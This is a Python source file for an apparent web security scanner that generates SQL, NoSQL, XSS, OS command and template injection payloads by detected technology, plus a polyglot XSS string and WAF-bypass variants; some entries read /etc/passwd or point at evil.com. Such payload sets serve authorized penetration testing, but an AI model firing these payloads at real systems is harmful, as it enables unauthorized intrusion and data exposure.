"""
v17.5: Context-Aware Payload Generator
Generates SQLi, XSS, Command Injection, and Template Injection payloads based on detected technology
"""
from typing import List, Dict, Any, Optional
import random
import string

class PayloadGenerator:
    """Generate context-aware payloads for various attack vectors"""
    
    def __init__(self):
        self.db_types = {
            'mysql': {
                'error_based': ["' OR '1'='1", "' UNION SELECT NULL--", "admin' --"],
                'time_based': ["'; SELECT SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--"],
                'blind': ["' AND 1=1--", "' AND 1=2--"],
            },
            'postgresql': {
                'error_based': ["' OR '1'='1", "' UNION SELECT NULL--"],
                'time_based': ["'; SELECT pg_sleep(5)--"],
                'blind': ["' AND 1=1--", "' AND 1=2--"],
            },
            'mssql': {
                'error_based': ["' OR '1'='1", "' UNION SELECT NULL--"],
                'time_based': ["'; WAITFOR DELAY '00:00:05'--"],
                'blind': ["' AND 1=1--", "' AND 1=2--"],
            },
            'oracle': {
                'error_based': ["' OR '1'='1", "' UNION SELECT NULL FROM DUAL--"],
                'time_based': ["'; DBMS_LOCK.SLEEP(5)--"],
                'blind': ["' AND 1=1--", "' AND 1=2--"],
            },
        }
        
        self.nosql_types = {
            'mongodb': [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$where": "this.username == this.password"}',
                '{"$regex": ".*"}',
            ],
            'couchdb': [
                '{"$ne": null}',
                '{"$gt": ""}',
            ],
        }
        
        self.xss_filters = {
            'basic': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
            ],
            'event_handler': [
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
            ],
            'csp_bypass': [
                "<link rel=prefetch href='//evil.com'>",
                "<base href='//evil.com/'>",
                "<meta http-equiv='refresh' content='0;url=//evil.com'>",
            ],
        }
        
        self.os_commands = {
            'linux': [
                "; id",
                "| id",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
            ],
            'windows': [
                "& whoami",
                "| whoami",
                "; whoami",
                "& type C:\\Windows\\win.ini",
                "| type C:\\Windows\\win.ini",
            ],
        }
        
        self.template_engines = {
            'jinja2': [
                "{{7*7}}",
                "{{config}}",
                "{{self.__dict__}}",
            ],
            'twig': [
                "{{7*7}}",
                "{{_self}}",
            ],
            'freemarker': [
                "${7*7}",
                "${product.getClass()}",
            ],
            'velocity': [
                "#set($x=7*7)$x",
            ],
            'smarty': [
                "{7*7}",
                "{php}echo 'test';{/php}",
            ],
        }
    
    def generate_sqli_payloads(self, db_type: str = 'mysql', technique: str = 'error_based') -> List[str]:
        """Generate SQL injection payloads based on database type"""
        if db_type.lower() in self.db_types:
            return self.db_types[db_type.lower()].get(technique, [])
        return self.db_types['mysql'][technique]  # Default to MySQL
    
    def generate_nosql_payloads(self, db_type: str = 'mongodb') -> List[str]:
        """Generate NoSQL injection payloads"""
        if db_type.lower() in self.nosql_types:
            return self.nosql_types[db_type.lower()]
        return self.nosql_types['mongodb']  # Default
    
    def generate_xss_payloads(self, filter_type: str = 'basic') -> List[str]:
        """Generate XSS payloads based on filter type"""
        if filter_type in self.xss_filters:
            return self.xss_filters[filter_type]
        return self.xss_filters['basic']
    
    def generate_command_injection_payloads(self, os_type: str = 'linux') -> List[str]:
        """Generate command injection payloads based on OS"""
        if os_type.lower() in self.os_commands:
            return self.os_commands[os_type.lower()]
        return self.os_commands['linux']  # Default
    
    def generate_ssti_payloads(self, template_engine: str = 'jinja2') -> List[str]:
        """Generate SSTI payloads based on template engine"""
        if template_engine.lower() in self.template_engines:
            return self.template_engines[template_engine.lower()]
        return self.template_engines['jinja2']  # Default
    
    def generate_polyglot_payload(self) -> str:
        """Generate polyglot payload that works in multiple contexts"""
        return "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
    
    def generate_waf_bypass_payloads(self, base_payload: str) -> List[str]:
        """Generate WAF bypass variations of a payload"""
        variations = []
        
        # Case variation
        variations.append(base_payload.upper())
        variations.append(base_payload.lower())
        variations.append(base_payload.swapcase())
        
        # Encoding variations
        variations.append(base_payload.replace(" ", "/**/"))
        variations.append(base_payload.replace("'", "%27"))
        variations.append(base_payload.replace("'", "\\'"))
        variations.append(base_payload.replace("'", "''"))
        
        # Null byte injection
        variations.append(base_payload.replace("'", "'%00"))
        
        # Comment injection
        variations.append(base_payload.replace(" ", "/*comment*/"))
        
        return variations
    
    def generate_contextual_payloads(self, context: Dict[str, Any]) -> Dict[str, List[str]]:
        """Generate payloads based on detected context"""
        payloads = {}
        
        # Database type
        db_type = context.get('database', 'mysql')
        if db_type:
            payloads['sqli'] = self.generate_sqli_payloads(db_type.lower())
        
        # OS type
        os_type = context.get('os', 'linux')
        if os_type:
            payloads['command_injection'] = self.generate_command_injection_payloads(os_type.lower())
        
        # Template engine
        template_engine = context.get('template_engine')
        if template_engine:
            payloads['ssti'] = self.generate_ssti_payloads(template_engine.lower())
        
        # XSS (always include)
        payloads['xss'] = self.generate_xss_payloads()
        
        return payloads


